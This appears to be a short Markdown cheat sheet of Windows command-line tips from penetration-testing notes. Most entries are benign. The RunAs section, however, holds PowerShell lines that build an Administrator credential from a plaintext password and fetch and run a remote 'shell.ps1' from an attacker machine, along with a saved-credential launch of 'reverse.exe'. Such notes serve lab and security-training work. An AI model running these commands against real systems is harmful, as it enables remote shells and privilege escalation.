## Windows


## Copy output to clipboard

```
| clip
```

## Get computers IP Address

```
ipconfig|find "IPv4"
```

## Use Environment Variables

```
echo %OS%
echo %PROCESSOR_ARCHITECTURE%
```

## Find Files

```
dir /s <filename> # or extensions
Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
```

## Find Large Files over 50MB

```
find / -type f -size +50M
```

## Display Environment Variables

```
set
```

## RunAs

```
# cmd
runas /savecred /user:admin C:\abcd\reverse.exe

# PowerShell Runas 1
$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred

# PowerShell Runas 2
$username = "domain\Administrator"
$password = "pass123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
```

## Wmi tasklist

```
Look at applications or services installed in Program Files directory is usually user installed
If so use 'icacls' to see permissions of said file and who can run said file
```